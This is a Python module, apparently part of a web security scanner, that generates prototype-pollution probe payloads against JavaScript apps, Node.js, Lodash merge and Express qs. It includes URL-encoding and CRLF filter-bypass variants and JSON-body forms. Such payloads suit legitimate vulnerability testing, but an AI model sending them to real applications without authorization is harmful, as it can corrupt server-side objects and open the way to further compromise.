"""Prototype pollution payload generation."""
from __future__ import annotations

import json
from dataclasses import dataclass
from urllib.parse import quote


@dataclass
class ProtoPayload:
    technique: str
    param_name: str
    param_value: str
    description: str


def prototype_pollution_payloads(
    probe_key: str = "polluted",
    probe_value: str = "1",
) -> list[ProtoPayload]:
    """Return all prototype pollution payload variants."""
    return [
        ProtoPayload(
            technique="proto-bracket",
            param_name=f"__proto__[{probe_key}]",
            param_value=probe_value,
            description="Direct __proto__ bracket notation",
        ),
        ProtoPayload(
            technique="constructor-chain",
            param_name=f"constructor[prototype][{probe_key}]",
            param_value=probe_value,
            description="Constructor chain via bracket notation",
        ),
        ProtoPayload(
            technique="constructor-dot",
            param_name=f"constructor.prototype[{probe_key}]",
            param_value=probe_value,
            description="Constructor.prototype mixed dot/bracket notation",
        ),
        ProtoPayload(
            technique="url-encoded",
            param_name=f"%5F%5Fproto%5F%5F[{probe_key}]",
            param_value=probe_value,
            description="URL-encoded underscores in __proto__ to bypass filters",
        ),
        ProtoPayload(
            technique="nested",
            param_name=f"__proto__[{probe_key}][subkey]",
            param_value=probe_value,
            description="Nested prototype pollution for deep merge targets",
        ),
        ProtoPayload(
            technique="crlf-bypass",
            param_name=f"__pro\rto__[{probe_key}]",
            param_value=probe_value,
            description="CRLF injection in param name to bypass some parsers",
        ),
        ProtoPayload(
            technique="json-proto",
            param_name="body",
            param_value=json.dumps({"__proto__": {probe_key: probe_value}}),
            description="JSON body with __proto__ key for JSON.parse targets",
        ),
        ProtoPayload(
            technique="json-constructor",
            param_name="body",
            param_value=json.dumps(
                {"constructor": {"prototype": {probe_key: probe_value}}}
            ),
            description="JSON body with constructor.prototype for JSON.parse targets",
        ),
        ProtoPayload(
            technique="merge-target",
            param_name=f"a[__proto__][{probe_key}]",
            param_value=probe_value,
            description="Prototype pollution via nested merge target parameter",
        ),
        ProtoPayload(
            technique="get-param",
            param_name=f"?__proto__[{probe_key}]",
            param_value=probe_value,
            description="GET query string prototype pollution",
        ),
    ]


def server_side_payloads(
    probe_key: str = "polluted",
    probe_value: str = "1",
) -> list[ProtoPayload]:
    """Payloads for server-side prototype pollution (Node.js, Lodash, etc.)."""
    return [
        ProtoPayload(
            technique="nodejs-json-proto",
            param_name="body",
            param_value=json.dumps({"__proto__": {probe_key: probe_value}}),
            description="Node.js JSON.parse __proto__ pollution",
        ),
        ProtoPayload(
            technique="nodejs-json-constructor",
            param_name="body",
            param_value=json.dumps(
                {"constructor": {"prototype": {probe_key: probe_value}}}
            ),
            description="Node.js JSON.parse constructor.prototype pollution",
        ),
        ProtoPayload(
            technique="lodash-merge-qs",
            param_name=f"__proto__[{probe_key}]",
            param_value=probe_value,
            description="Lodash _.merge via query string — targets qs/body-parser",
        ),
        ProtoPayload(
            technique="express-qs-encoded",
            param_name=f"{quote('__proto__')}[{probe_key}]",
            param_value=probe_value,
            description="Express.js qs library with URL-encoded __proto__",
        ),
    ]
